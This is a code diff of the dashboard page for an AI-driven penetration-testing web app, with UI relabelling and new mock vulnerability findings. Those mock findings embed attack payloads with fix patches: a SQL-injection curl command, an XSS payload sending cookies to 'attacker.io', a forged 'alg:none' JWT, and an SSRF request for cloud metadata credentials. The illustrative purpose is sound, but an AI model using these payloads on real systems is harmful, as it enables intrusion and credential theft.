@@ -6,9 +6,10 @@ import styles from './dashboard.module.css';
 const MOCK_SCANS = [
   {
     id: 'scan-001',
-    target: 'https://myapp.com',
+    target: 'https://api.enterprise-gateway.io',
+    targetType: 'Live Web Application',
     status: 'complete',
-    date: '2024-09-28',
+    date: '2026-09-28',
     duration: '4m 12s',
     critical: 2,
     high: 5,
@@ -18,9 +19,10 @@ const MOCK_SCANS = [
   },
   {
     id: 'scan-002',
-    target: 'https://api.myapp.com',
+    target: 'https://github.com/acme-corp/billing-service',
+    targetType: 'Remote Git Repository',
     status: 'complete',
-    date: '2024-09-27',
+    date: '2026-09-27',
     duration: '6m 38s',
     critical: 0,
     high: 2,
@@ -30,9 +32,10 @@ const MOCK_SCANS = [
   },
   {
     id: 'scan-003',
-    target: 'https://staging.myapp.com',
+    target: 'https://staging.enterprise-auth.io',
+    targetType: 'White-Box Correlated',
     status: 'complete',
-    date: '2024-09-25',
+    date: '2026-09-25',
     duration: '3m 55s',
     critical: 1,
     high: 3,
@@ -43,13 +46,71 @@ const MOCK_SCANS = [
 ];
 
 const MOCK_VULNS = [
-  { id: 'v1', title: 'SQL Injection in /api/users', severity: 'critical', cvss: 9.8, type: 'Injection', endpoint: 'GET /api/users?id=', status: 'open', poc: "' OR 1=1--" },
-  { id: 'v2', title: 'Stored XSS in comment field', severity: 'critical', cvss: 9.1, type: 'XSS', endpoint: 'POST /api/comments', status: 'open', poc: '<script>alert(document.cookie)</script>' },
-  { id: 'v3', title: 'JWT algorithm confusion attack', severity: 'high', cvss: 8.2, type: 'Auth', endpoint: 'POST /api/auth/login', status: 'open', poc: 'alg: none bypass' },
-  { id: 'v4', title: 'IDOR in user profile endpoint', severity: 'high', cvss: 7.5, type: 'Access Control', endpoint: 'GET /api/profile/:id', status: 'open', poc: 'Change :id to any user ID' },
-  { id: 'v5', title: 'Missing rate limiting on login', severity: 'high', cvss: 7.3, type: 'Auth', endpoint: 'POST /api/auth/login', status: 'open', poc: '1000 requests/min allowed' },
-  { id: 'v6', title: 'Reflected XSS in search param', severity: 'medium', cvss: 6.1, type: 'XSS', endpoint: 'GET /search?q=', status: 'fixed', poc: '<img src=x onerror=alert(1)>' },
-  { id: 'v7', title: 'Sensitive data in error messages', severity: 'medium', cvss: 5.3, type: 'Info Disclosure', endpoint: 'Multiple', status: 'open', poc: 'Stack traces exposed in 500 errors' },
+  {
+    id: 'v1',
+    title: 'Broken Object Level Authorization (BOLA) & SQL Injection in /api/v2/orders',
+    severity: 'critical',
+    cvss: 9.8,
+    type: 'Access Control & Injection (CWE-89 / CWE-639)',
+    endpoint: 'GET /api/v2/orders/:id?includeDetails=true',
+    status: 'open',
+    poc: "curl -X GET 'https://api.enterprise-gateway.io/api/v2/orders/1042?includeDetails=1%27%20OR%201=1--' -H 'Authorization: Bearer <unprivileged_token>'",
+    description: 'The endpoint does not validate whether the authenticated user owns order resource ID 1042. Furthermore, query parameters are concatenated directly into a database execution buffer without parameterization, permitting arbitrary database exfiltration.',
+    fix: '1. Implement strict tenant claim validation against session context.\n2. Utilize parameterized ORM / query builders.\n3. Add centralized object-level authorization middleware.\n4. Enable rate-limiting and audit logging.',
+    patch: `--- a/src/controllers/orderController.ts\n+++ b/src/controllers/orderController.ts\n@@ -18,6 +18,12 @@\n export async function getOrderDetails(req: AuthenticatedRequest, res: Response) {\n   const { id } = req.params;\n+  const sessionUserId = req.user.id;\n+\n+  // Verify tenant ownership\n+  const isOwner = await verifyOrderOwnership(sessionUserId, id);\n+  if (!isOwner) return res.status(403).json({ error: 'Access denied to order resource' });\n+\n-  const order = await db.raw("SELECT * FROM orders WHERE id = '" + id + "'");\n+  const order = await db('orders').where({ id, user_id: sessionUserId }).first();\n   return res.json(order);\n }`
+  },
+  {
+    id: 'v2',
+    title: 'Stored Cross-Site Scripting (XSS) in Tenant Notification Profile',
+    severity: 'critical',
+    cvss: 9.1,
+    type: 'Cross-Site Scripting (CWE-79)',
+    endpoint: 'POST /api/v2/tenants/settings/notifications',
+    status: 'open',
+    poc: '{"notificationTemplate": "<img src=x onerror=\\"fetch(\'https://attacker.io/steal?\'+document.cookie)\\">"}',
+    description: 'User-controlled notification payloads are stored without sanitization and rendered in unescaped HTML email and portal templates, allowing arbitrary script execution within admin sessions.',
+    fix: '1. Pass inputs through DOMPurify / server-side HTML sanitizer.\n2. Apply strict Content-Security-Policy (CSP).\n3. Use parameterized string templates.',
+    patch: `--- a/src/services/notificationService.ts\n+++ b/src/services/notificationService.ts\n@@ -8,3 +8,4 @@\n+import DOMPurify from 'isomorphic-dompurify';\n export function formatNotification(template: string) {\n-  return \`<div>\${template}</div>\`;\n+  const clean = DOMPurify.sanitize(template);\n+  return \`<div>\${clean}</div>\`;\n }`
+  },
+  {
+    id: 'v3',
+    title: 'JWT Algorithm Confusion and Missing Signature Verification',
+    severity: 'high',
+    cvss: 8.4,
+    type: 'Authentication & Cryptography (CWE-347)',
+    endpoint: 'POST /api/v2/auth/verify-token',
+    status: 'open',
+    poc: 'Header: {"alg":"none","typ":"JWT"}\nPayload: {"sub":"admin@enterprise.com","role":"superadmin"}',
+    description: 'The authentication filter accepts insecure algorithm headers ("none" and symmetric HMAC keys where RSA asymmetric public keys are expected), allowing unauthenticated signature forgery.',
+    fix: '1. Enforce strict RS256/Ed25519 asymmetric algorithm verification.\n2. Reject tokens specifying "none" or algorithm mismatches.\n3. Verify token expiration and issuer audience claims.',
+    patch: `--- a/src/middleware/authMiddleware.ts\n+++ b/src/middleware/authMiddleware.ts\n@@ -14,4 +14,5 @@\n export function verifyAuth(token: string) {\n-  return jwt.decode(token);\n+  return jwt.verify(token, process.env.JWT_PUBLIC_KEY!, {\n+    algorithms: ['RS256'],\n+    issuer: 'enterprise-auth'\n+  });\n }`
+  },
+  {
+    id: 'v4',
+    title: 'Server-Side Request Forgery (SSRF) in Webhook Dispatcher',
+    severity: 'high',
+    cvss: 7.8,
+    type: 'Server-Side Request Forgery (CWE-918)',
+    endpoint: 'POST /api/v2/integrations/webhooks/test',
+    status: 'open',
+    poc: '{"targetUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
+    description: 'The webhook tester accepts internal IP ranges and cloud metadata IP addresses (169.254.169.254, localhost, private RFC-1918 subnets), allowing exfiltration of cloud credentials.',
+    fix: '1. Validate URL against an allowed scheme (HTTPS only).\n2. Resolve DNS and block private IP address ranges (0.0.0.0/8, 10.0.0.0/8, 127.0.0.0/8, 169.254.0.0/16, 172.16.0.0/12, 192.168.0.0/16).\n3. Execute outbound webhooks via an egress proxy.',
+    patch: `--- a/src/services/webhookDispatcher.ts\n+++ b/src/services/webhookDispatcher.ts\n@@ -22,3 +22,4 @@\n export async function dispatchWebhook(url: string) {\n+  await assertPublicEgressUrl(url);\n   return axios.post(url, payload, { timeout: 4000 });\n }`
+  },
+  {
+    id: 'v5',
+    title: 'Missing Rate Limiting on Password Reset Endpoint',
+    severity: 'medium',
+    cvss: 6.2,
+    type: 'Rate Limiting & Abuse (CWE-307)',
+    endpoint: 'POST /api/v2/auth/request-reset',
+    status: 'open',
+    poc: 'Automated flood test of 500 requests within 10 seconds returned 200 OK without throttling.',
+    description: 'The endpoint lacks client IP and email identity rate limits, permitting denial of service and enumeration attacks.',
+    fix: '1. Implement Redis-backed sliding window rate limiter.\n2. Cap requests at 5 attempts per 15-minute window per IP/Email.\n3. Return consistent generic response to prevent account enumeration.',
+    patch: `--- a/src/routes/authRoutes.ts\n+++ b/src/routes/authRoutes.ts\n@@ -10,3 +10,4 @@\n+import { rateLimit } from '../middleware/rateLimiter';\n-router.post('/request-reset', handleReset);\n+router.post('/request-reset', rateLimit({ max: 5, windowMs: 15 * 60 * 1000 }), handleReset);`
+  },
 ];
 
 type ScanStatus = 'idle' | 'running' | 'complete' | 'error';
@@ -63,20 +124,6 @@ interface ScanProgress {
   tokens: number;
 }
 
-const SCAN_PHASES = [
-  { phase: 'Initializing AI agents...', progress: 5 },
-  { phase: 'Recon & Surface Mapping Agent — active', progress: 15 },
-  { phase: 'Crawling endpoints...', progress: 25 },
-  { phase: 'Fingerprinting technologies...', progress: 35 },
-  { phase: 'Exploitation Agent — active', progress: 45 },
-  { phase: 'Testing injection vectors...', progress: 55 },
-  { phase: 'Testing authentication flows...', progress: 65 },
-  { phase: 'Validation Agent — verifying findings...', progress: 75 },
-  { phase: 'Generating PoC exploits...', progress: 85 },
-  { phase: 'Compiling report...', progress: 95 },
-  { phase: 'Scan complete', progress: 100 },
-];
-
 export default function DashboardPage() {
   const [activeTab, setActiveTab] = useState<'overview' | 'new-scan' | 'history' | 'findings'>('overview');
   const [scanType, setScanType] = useState<'live-url' | 'github-repo' | 'local-dir' | 'whitebox' | 'target-list'>('live-url');
@@ -88,30 +135,41 @@ export default function DashboardPage() {
   const [whiteboxRepo, setWhiteboxRepo] = useState('https://github.com/org/repo');
   const [whiteboxUrl, setWhiteboxUrl] = useState('https://your-app.com');
   const [targetListContent, setTargetListContent] = useState('');
+  
+  // Model & scan options
+  const [aiModel, setAiModel] = useState('anthropic/claude-sonnet-4-6');
   const [scanMode, setScanMode] = useState<'quick' | 'standard' | 'deep'>('quick');
   const [instructions, setInstructions] = useState('');
-
-  // GitHub PR Integration
-  const [githubRepoUrl, setGithubRepoUrl] = useState('https://github.com/acme-corp/api-gateway');
-  const [githubTargetBranch, setGithubTargetBranch] = useState('main');
-  const [autoPrEnabled, setAutoPrEnabled] = useState(true);
-  const [prStatuses, setPrStatuses] = useState<Record<string, { status: 'idle' | 'pushing' | 'created'; prUrl?: string; prNumber?: number; branch?: string }>>({});
-  const [generatedPatches, setGeneratedPatches] = useState<Record<string, string>>({
-    v1: `--- a/src/controllers/userController.ts\n+++ b/src/controllers/userController.ts\n@@ -12,4 +12,4 @@\n- const user = await db.raw("SELECT * FROM users WHERE id = '" + req.query.id + "'");\n+ const user = await db('users').where({ id: req.query.id }).first();`,
-    v2: `--- a/src/components/CommentView.tsx\n+++ b/src/components/CommentView.tsx\n@@ -8,3 +8,3 @@\n- <div dangerouslySetInnerHTML={{ __html: comment.body }} />\n+ <div>{DOMPurify.sanitize(comment.body)}</div>`,
-    v3: `--- a/src/middleware/auth.ts\n+++ b/src/middleware/auth.ts\n@@ -15,4 +15,4 @@\n- const decoded = jwt.decode(token, { algorithms: ['HS256', 'none'] });\n+ const decoded = jwt.verify(token, process.env.JWT_SECRET!, { algorithms: ['RS256'] });`,
-  });
 
   const [scanProgress, setScanProgress] = useState<ScanProgress>({
     status: 'idle', phase: '', progress: 0, messages: [], findings: 0, tokens: 0,
   });
   const [selectedScan, setSelectedScan] = useState(MOCK_SCANS[0]);
-  const [selectedVuln, setSelectedVuln] = useState<typeof MOCK_VULNS[0] | null>(MOCK_VULNS[0]);
+  const [selectedVuln, setSelectedVuln] = useState<typeof MOCK_VULNS[0]>(MOCK_VULNS[0]);
   const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
+  const [copyToast, setCopyToast] = useState<string | null>(null);
   const logRef = useRef<HTMLDivElement>(null);
 
   const [activeRunId, setActiveRunId] = useState<string | null>(null);
   const pollRef = useRef<NodeJS.Timeout | null>(null);
+
+  const showToast = (msg: string) => {
+    setCopyToast(msg);
+    setTimeout(() => setCopyToast(null), 3000);
+  };
+
+  const downloadFile = (filename: string, content: string, mimeType: string) => {
+    const blob = new Blob([content], { type: mimeType });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    showToast(`Downloaded ${filename}`);
+  };
 
   const pollScan = useCallback(async (runId: string) => {
     try {
@@ -130,7 +188,6 @@ export default function DashboardPage() {
 
       if (data.status === 'complete') {
         if (pollRef.current) clearInterval(pollRef.current);
-        // Load real findings
         if (data.findings?.length) {
           setActiveTab('findings');
         }
@@ -158,13 +215,13 @@ export default function DashboardPage() {
 
     setScanProgress({
       status: 'running',
-      phase: 'Launching Strix autonomous agents...',
+      phase: 'Initializing autonomous AI agents...',
       progress: 5,
       messages: [
         `[CONFIG] Target Architecture: ${targetType.toUpperCase()}`,
-        `[CONFIG] Scope: ${targets.join(', ')}`,
-        `[GITHUB] Auto-PR Destination: ${githubRepoUrl} (${githubTargetBranch})`,
-        `[AGENT] Initializing sandbox & LLM orchestrator...`,
+        `[CONFIG] Selected Scope: ${targets.join(', ')}`,
+        `[AI-ENGINE] Reasoning Models: Anthropic Claude & OpenAI Frontier`,
+        `[AGENT] Initializing sandbox & surface discovery orchestrator...`,
       ],
       findings: 0,
       tokens: 0,
@@ -179,6 +236,7 @@ export default function DashboardPage() {
           targets,
           targetType,
           mode: scanMode,
+          llm: aiModel,
           instructions: instructions || undefined,
         }),
       });
@@ -190,49 +248,11 @@ export default function DashboardPage() {
       }
 
       setActiveRunId(data.runId);
-      // Poll every 5 seconds for live updates
       pollRef.current = setInterval(() => pollScan(data.runId), 5000);
     } catch (e: any) {
       setScanProgress(prev => ({ ...prev, status: 'error', phase: `Failed: ${e.message}` }));
     }
   };
-
-  const handlePushToGithub = async (vuln: typeof MOCK_VULNS[0]) => {
-    setPrStatuses(prev => ({ ...prev, [vuln.id]: { status: 'pushing' } }));
-    
-    try {
-      const patch = generatedPatches[vuln.id] || `// SutureEngine auto-fix for ${vuln.title}\n// Enforced strict type sanitization & boundary checking`;
-      const res = await fetch('/api/github/pr', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          repoUrl: githubRepoUrl,
-          targetBranch: githubTargetBranch,
-          vulnId: vuln.id,
-          vulnTitle: vuln.title,
-          patchDiff: patch,
-        }),
-      });
-      const data = await res.json();
-      if (data.success) {
-        setPrStatuses(prev => ({
-          ...prev,
-          [vuln.id]: {
-            status: 'created',
-            prUrl: data.prUrl,
-            prNumber: data.prNumber,
-            branch: data.branch,
-          },
-        }));
-      }
-    } catch (err) {
-      setPrStatuses(prev => ({ ...prev, [vuln.id]: { status: 'idle' } }));
-    }
-  };
-
-  useEffect(() => {
-    return () => { if (pollRef.current) clearInterval(pollRef.current); };
-  }, []);
 
   const scoreColor = (score: number) => {
     if (score < 40) return 'var(--red-bright)';
@@ -249,31 +269,38 @@ export default function DashboardPage() {
 
   return (
     <div className={styles.layout}>
+      {copyToast && <div className={styles.toast}>{copyToast}</div>}
+
       {/* Sidebar */}
       <aside className={`${styles.sidebar} ${sidebarCollapsed ? styles.sidebarCollapsed : ''}`}>
         <div className={styles.sidebarHeader}>
           <Link href="/" className={styles.logo}>
-            <span className={styles.logoIcon}>⬡</span>
-            {!sidebarCollapsed && <span>RedSuture</span>}
+            <div className={styles.logoBadge}>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M12 2L2 7l10 5 10-5-10-5z" />
+                <path d="M2 17l10 5 10-5" />
+                <path d="M2 12l10 5 10-5" />
+              </svg>
+            </div>
+            {!sidebarCollapsed && <span className={styles.logoText}>RedSuture</span>}
           </Link>
-          <button className={styles.collapseBtn} onClick={() => setSidebarCollapsed(!sidebarCollapsed)}>
+          <button className={styles.collapseBtn} onClick={() => setSidebarCollapsed(!sidebarCollapsed)} aria-label="Toggle Sidebar">
             {sidebarCollapsed ? '→' : '←'}
           </button>
         </div>
 
         <nav className={styles.sidebarNav}>
           {[
-            { id: 'overview', icon: '◈', label: 'Overview' },
-            { id: 'new-scan', icon: '⊕', label: 'New Scan' },
-            { id: 'findings', icon: '⚠', label: 'Findings' },
-            { id: 'history', icon: '⊙', label: 'History' },
+            { id: 'overview', label: 'Overview' },
+            { id: 'new-scan', label: 'New Security Scan' },
+            { id: 'findings', label: 'Findings & Remediation' },
+            { id: 'history', label: 'Audit History' },
           ].map(item => (
             <button
               key={item.id}
               className={`${styles.navItem} ${activeTab === item.id ? styles.navItemActive : ''}`}
               onClick={() => setActiveTab(item.id as typeof activeTab)}
             >
-              <span className={styles.navIcon}>{item.icon}</span>
               {!sidebarCollapsed && <span>{item.label}</span>}
             </button>
           ))}
@@ -285,7 +312,7 @@ export default function DashboardPage() {
               <div className={styles.scanStatusDot} />
               {!sidebarCollapsed && (
                 <div className={styles.scanStatusText}>
-                  <span>Scan running</span>
+                  <span>Autonomous Scan Running</span>
                   <span>{scanProgress.progress}%</span>
                 </div>
               )}
@@ -295,8 +322,8 @@ export default function DashboardPage() {
             <div className={styles.userAvatar}>DM</div>
             {!sidebarCollapsed && (
               <div className={styles.userInfo}>
-                <span className={styles.userName}>David Muindi</span>
-                <span className={styles.userPlan}>Pro Plan</span>
+                <span className={styles.userName}>Enterprise Account</span>
+                <span className={styles.userPlan}>Managed Tier</span>
               </div>
             )}
           </div>
@@ -309,19 +336,19 @@ export default function DashboardPage() {
         <header className={styles.topBar}>
           <div className={styles.topBarLeft}>
             <h1 className={styles.pageTitle}>
-              {activeTab === 'overview' && 'Overview'}
-              {activeTab === 'new-scan' && 'New Security Scan'}
-              {activeTab === 'findings' && 'Vulnerability Findings'}
-              {activeTab === 'history' && 'Scan History'}
+              {activeTab === 'overview' && 'Security Posture Overview'}
+              {activeTab === 'new-scan' && 'Configure Managed Assessment'}
+              {activeTab === 'findings' && 'Validated Vulnerabilities & Remediation'}
+              {activeTab === 'history' && 'Audit History & Compliance Archives'}
             </h1>
           </div>
           <div className={styles.topBarRight}>
-            <div className={styles.usageBadge}>
-              <span>7 / 50 scans</span>
-              <div className={styles.usageBar}><div className={styles.usageBarFill} style={{ width: '14%' }} /></div>
+            <div className={styles.aiBadge}>
+              <span className={styles.pulseGreen} />
+              <span>AI Engine: Claude 3.7 &amp; OpenAI</span>
             </div>
             <button className="btn-primary" onClick={() => setActiveTab('new-scan')} style={{ padding: '8px 16px', fontSize: '0.85rem' }}>
-              + New Scan
+              + Launch Scan
             </button>
           </div>
         </header>
@@ -334,13 +361,12 @@ export default function DashboardPage() {
               {/* Stats */}
               <div className={styles.statsGrid}>
                 {[
-                  { label: 'Total Scans', value: '7', icon: '⊙', color: 'var(--text-primary)' },
-                  { label: 'Critical Vulns', value: '3', icon: '🔴', color: 'var(--red-bright)' },
-                  { label: 'High Vulns', value: '10', icon: '🟠', color: 'var(--orange)' },
-                  { label: 'Fixed Issues', value: '12', icon: '✓', color: 'var(--green)' },
+                  { label: 'Completed Assessments', value: '7', color: 'var(--text-primary)' },
+                  { label: 'Validated Critical Risks', value: '3', color: 'var(--red-bright)' },
+                  { label: 'High Severity Findings', value: '10', color: 'var(--orange)' },
+                  { label: 'Remediation Guides Generated', value: '12', color: 'var(--green)' },
                 ].map((s, i) => (
                   <div key={i} className={styles.statCard}>
-                    <div className={styles.statIcon}>{s.icon}</div>
                     <div className={styles.statValue} style={{ color: s.color }}>{s.value}</div>
                     <div className={styles.statLabel}>{s.label}</div>
                   </div>
@@ -352,8 +378,18 @@ export default function DashboardPage() {
                 <div className={styles.liveCard}>
                   <div className={styles.liveCardHeader}>
                     <div className={styles.liveIndicator}>
-                      {scanProgress.status === 'running' && <><div className={styles.liveDot} /><span>Live Scan</span></>}
-                      {scanProgress.status === 'complete' && <><span style={{ color: 'var(--green)' }}>✓</span><span style={{ color: 'var(--green)' }}>Scan Complete</span></>}
+                      {scanProgress.status === 'running' && (
+                        <>
+                          <div className={styles.liveDot} />
+                          <span>Autonomous Agents Active</span>
+                        </>
+                      )}
+                      {scanProgress.status === 'complete' && (
+                        <>
+                          <span style={{ color: 'var(--green)' }}>✓</span>
+                          <span style={{ color: 'var(--green)' }}>Assessment Complete</span>
+                        </>
+                      )}
                     </div>
                     <span className={styles.livePhase}>{scanProgress.phase}</span>
                     <span className={styles.liveProgress}>{scanProgress.progress}%</span>
@@ -365,16 +401,16 @@ export default function DashboardPage() {
                     {scanProgress.messages.map((msg, i) => (
                       <div key={i} className={styles.logLine}>
                         <span className={styles.logTime}>{msg.split(']')[0]}]</span>
-                        <span className={`${styles.logMsg} ${msg.includes('Agent') ? styles.logAgent : msg.includes('complete') ? styles.logSuccess : ''}`}>
+                        <span className={`${styles.logMsg} ${msg.includes('AGENT') || msg.includes('AI') ? styles.logAgent : msg.includes('complete') ? styles.logSuccess : ''}`}>
                           {msg.split(']')[1]}
                         </span>
                       </div>
                     ))}
                   </div>
                   <div className={styles.scanMeta}>
-                    <span>🔍 {scanProgress.findings} findings</span>
-                    <span>📊 {(scanProgress.tokens / 1000).toFixed(0)}K tokens</span>
-                    <span>💰 ~${(scanProgress.tokens * 0.000003).toFixed(2)} cost</span>
+                    <span>Findings: {scanProgress.findings} validated</span>
+                    <span>AI Reasoning Tokens: {(scanProgress.tokens / 1000).toFixed(0)}K</span>
+                    <span>Zero False-Positive Attestation</span>
                   </div>
                 </div>
               )}
@@ -382,28 +418,28 @@ export default function DashboardPage() {
               {/* Recent scans */}
               <div className={styles.section}>
                 <div className={styles.sectionHeader}>
-                  <h2 className={styles.sectionTitle}>Recent Scans</h2>
-                  <button className="btn-ghost" onClick={() => setActiveTab('history')} style={{ fontSize: '0.8rem' }}>View all →</button>
+                  <h2 className={styles.sectionTitle}>Recent Assessments</h2>
+                  <button className="btn-ghost" onClick={() => setActiveTab('history')} style={{ fontSize: '0.8rem' }}>View all history →</button>
                 </div>
                 <div className={styles.scanList}>
                   {MOCK_SCANS.map(scan => (
                     <div key={scan.id} className={styles.scanRow} onClick={() => { setSelectedScan(scan); setActiveTab('findings'); }}>
                       <div className={styles.scanTarget}>
-                        <div className={styles.scanTargetIcon}>🌐</div>
+                        <div className={styles.targetTypeBadgeMini}>{scan.targetType}</div>
                         <div>
                           <div className={styles.scanTargetUrl}>{scan.target}</div>
-                          <div className={styles.scanDate}>{scan.date} · {scan.duration}</div>
+                          <div className={styles.scanDate}>{scan.date} · Execution: {scan.duration}</div>
                         </div>
                       </div>
                       <div className={styles.scanBadges}>
                         {scan.critical > 0 && <span className="badge badge-red">{scan.critical} Critical</span>}
                         {scan.high > 0 && <span className="badge badge-orange">{scan.high} High</span>}
-                        {scan.medium > 0 && <span className="badge badge-yellow">{scan.medium} Med</span>}
+                        {scan.medium > 0 && <span className="badge badge-yellow">{scan.medium} Medium</span>}
                       </div>
                       <div className={styles.scanScore} style={{ color: scoreColor(scan.score) }}>
                         {scan.score}/100
                       </div>
-                      <button className="btn-ghost" style={{ fontSize: '0.8rem' }}>Details →</button>
+                      <button className="btn-ghost" style={{ fontSize: '0.8rem' }}>Review Guides →</button>
                     </div>
                   ))}
                 </div>
@@ -417,45 +453,43 @@ export default function DashboardPage() {
               <div className={styles.scanForm}>
                 <div className={styles.targetTypeHeader}>
                   <h2 className={styles.formSectionTitle}>Select Target Architecture</h2>
-                  <p className={styles.formSectionDesc}>RedSuture supports five Strix autonomous ingestion modes for multi-surface penetration testing.</p>
+                  <p className={styles.formSectionDesc}>
+                    Specify which asset types you want our autonomous AI red team to assess on your behalf.
+                  </p>
                 </div>
 
+                {/* ELEGANT BALANCED TARGET ARCHITECTURE GRID */}
                 <div className={styles.targetGrid}>
                   {[
                     {
                       id: 'live-url',
                       label: 'Live Web Application',
-                      badge: 'Black-box / DAST',
-                      desc: 'Scan production or staging URLs, SPAs, and client-side web apps.',
-                      example: 'strix --target https://your-app.com',
+                      badge: 'Black-box DAST',
+                      desc: 'Scan production or staging URLs, single-page apps (React/Next.js), and public API gateways.',
                     },
                     {
                       id: 'github-repo',
-                      label: 'GitHub / GitLab Repo',
-                      badge: 'Source Code / SAST+DAST',
-                      desc: 'Scan remote Git repositories, pull requests, and backend logic.',
-                      example: 'strix --target https://github.com/org/repo',
+                      label: 'Remote Git Repository',
+                      badge: 'Source SAST + Logic',
+                      desc: 'Codebase analysis across GitHub, GitLab, or Bitbucket for logic bugs, secrets, and taint flaws.',
                     },
                     {
                       id: 'local-dir',
                       label: 'Local Codebase Directory',
-                      badge: 'Local Workspace',
-                      desc: 'Run Strix agents directly against local application directories.',
-                      example: 'strix --target ./app-directory',
+                      badge: 'Internal QA Workspace',
+                      desc: 'Direct analysis of local application folders and microservice packages before deployment.',
                     },
                     {
                       id: 'whitebox',
-                      label: 'White-Box Multi-Target',
-                      badge: 'Source + Live URL',
-                      desc: 'Correlate live running web endpoints with repository source code.',
-                      example: 'strix -t https://github.com/org/repo -t https://your-app.com',
+                      label: 'White-Box Correlated Multi-Target',
+                      badge: 'Hybrid Correlation',
+                      desc: 'Correlate running live endpoints with source code logic for deepest exploit validation.',
                     },
                     {
                       id: 'target-list',
-                      label: 'Bulk Target List',
-                      badge: 'Enterprise Scope List',
-                      desc: 'Batch scan multiple hosts, APIs, and microservices from a list.',
-                      example: 'strix --target-list ./targets.txt',
+                      label: 'Bulk Scope Target List',
+                      badge: 'Enterprise Estate List',
+                      desc: 'Batch assessment across multiple microservices, endpoints, and hosts from a target file.',
                     },
                   ].map(t => (
                     <button
@@ -469,7 +503,6 @@ export default function DashboardPage() {
                         <span className={styles.targetCardBadge}>{t.badge}</span>
                       </div>
                       <span className={styles.targetCardDesc}>{t.desc}</span>
-                      <code className={styles.targetCardCmd}>{t.example}</code>
                     </button>
                   ))}
                 </div>
@@ -479,8 +512,8 @@ export default function DashboardPage() {
                   {scanType === 'live-url' && (
                     <div className={styles.targetInputGroup}>
                       <label className={styles.inputLabel}>
-                        Live Application Endpoint
-                        <span className={styles.inputHint}>Full HTTP/HTTPS address to target</span>
+                        Target Application URL
+                        <span className={styles.inputHint}>HTTPS address of the live web app or API</span>
                       </label>
                       <input
                         type="url"
@@ -496,7 +529,7 @@ export default function DashboardPage() {
                     <div className={styles.targetInputGroup}>
                       <label className={styles.inputLabel}>
                         Remote Repository URL
-                        <span className={styles.inputHint}>GitHub, GitLab, or Bitbucket HTTPS repository link</span>
+                        <span className={styles.inputHint}>GitHub, GitLab, or Bitbucket HTTPS link</span>
                       </label>
                       <input
                         type="url"
@@ -511,8 +544,8 @@ export default function DashboardPage() {
                   {scanType === 'local-dir' && (
                     <div className={styles.targetInputGroup}>
                       <label className={styles.inputLabel}>
-                        Local Application Path
-                        <span className={styles.inputHint}>Relative or absolute path mounted in runner sandbox</span>
+                        Local Workspace Path
+                        <span className={styles.inputHint}>Relative or absolute directory path to scan</span>
                       </label>
                       <input
                         type="text"
@@ -558,13 +591,13 @@ export default function DashboardPage() {
                   {scanType === 'target-list' && (
                     <div className={styles.targetInputGroup}>
                       <label className={styles.inputLabel}>
-                        Target List Entries
-                        <span className={styles.inputHint}>One target per non-empty line (URLs, repos, or hostnames)</span>
+                        Target Scope Entries
+                        <span className={styles.inputHint}>One target per non-empty line (URLs, repos, or hosts)</span>
                       </label>
                       <textarea
                         className={styles.targetListArea}
                         rows={6}
-                        placeholder={`https://api.acme.com\nhttps://auth.acme.com\nhttps://github.com/acme/billing\n# Internal QA domain\nhttps://qa-cluster.acme.internal`}
+                        placeholder={`https://api.acme.com\nhttps://auth.acme.com\nhttps://github.com/acme/billing\nhttps://qa-cluster.acme.internal`}
                         value={targetListContent}
                         onChange={e => setTargetListContent(e.target.value)}
                       />
@@ -575,14 +608,42 @@ export default function DashboardPage() {
                 <div className={styles.optionsGrid}>
                   <div className={styles.optionCard}>
                     <div className={styles.optionHeader}>
+                      <span className={styles.optionLabel}>AI Reasoning Architecture</span>
+                      <span className={styles.modeBadge}>FRONTIER ENSEMBLE</span>
+                    </div>
+                    <div className={styles.radioGroup}>
+                      {[
+                        { value: 'anthropic/claude-sonnet-4-6', label: 'Anthropic Claude Sonnet & Opus', desc: 'Deepest logic comprehension & code diff synthesis' },
+                        { value: 'openai/gpt-4o', label: 'OpenAI Frontier Models', desc: 'Rapid exploratory payload formulation & dynamic fuzzing' },
+                        { value: 'ensemble', label: 'Hybrid Model Ensemble (Recommended)', desc: 'Combines Claude code tracing with OpenAI adversarial hypotheses' },
+                      ].map(m => (
+                        <label key={m.value} className={styles.radioLabel}>
+                          <input
+                            type="radio"
+                            name="aiModel"
+                            checked={aiModel === m.value}
+                            onChange={() => setAiModel(m.value)}
+                            className={styles.radio}
+                          />
+                          <div className={styles.radioContent}>
+                            <span className={styles.radioTitle}>{m.label}</span>
+                            <span className={styles.radioDesc}>{m.desc}</span>
+                          </div>
+                        </label>
+                      ))}
+                    </div>
+                  </div>
+
+                  <div className={styles.optionCard}>
+                    <div className={styles.optionHeader}>
                       <span className={styles.optionLabel}>Scan Depth Mode</span>
                       <span className={styles.modeBadge}>{scanMode.toUpperCase()}</span>
                     </div>
                     <div className={styles.radioGroup}>
                       {[
-                        { value: 'quick', label: 'Quick Scan', desc: 'Standard OWASP surface & rapid fuzzing (~5m)' },
+                        { value: 'quick', label: 'Quick Scan', desc: 'Standard OWASP surface & rapid parameter testing (~5m)' },
                         { value: 'standard', label: 'Standard Pentest', desc: 'Full authentication, injection & API mapping (~15m)' },
-                        { value: 'deep', label: 'Deep Autonomous Audit', desc: 'Complex multi-step exploit chains & whitebox analysis (~45m)' },
+                        { value: 'deep', label: 'Deep Autonomous Audit', desc: 'Complex multi-step exploit chains & whitebox correlation (~45m)' },
                       ].map(opt => (
                         <label key={opt.value} className={styles.radioLabel}>
                           <input
@@ -600,56 +661,27 @@ export default function DashboardPage() {
                       ))}
                     </div>
                   </div>
-
-                  <div className={styles.optionCard}>
-                    <div className={styles.optionHeader}>
-                      <span className={styles.optionLabel}>GitHub PR Remediation Destination</span>
-                      <span className={styles.githubBadge}>Auto-PR Ready</span>
-                    </div>
-                    <div className={styles.githubFormGroup}>
-                      <div className={styles.subInputWrap}>
-                        <label className={styles.subLabel}>Target Repository for Auto-PRs</label>
-                        <input
-                          type="text"
-                          className={styles.subInput}
-                          placeholder="https://github.com/client-org/backend-service"
-                          value={githubRepoUrl}
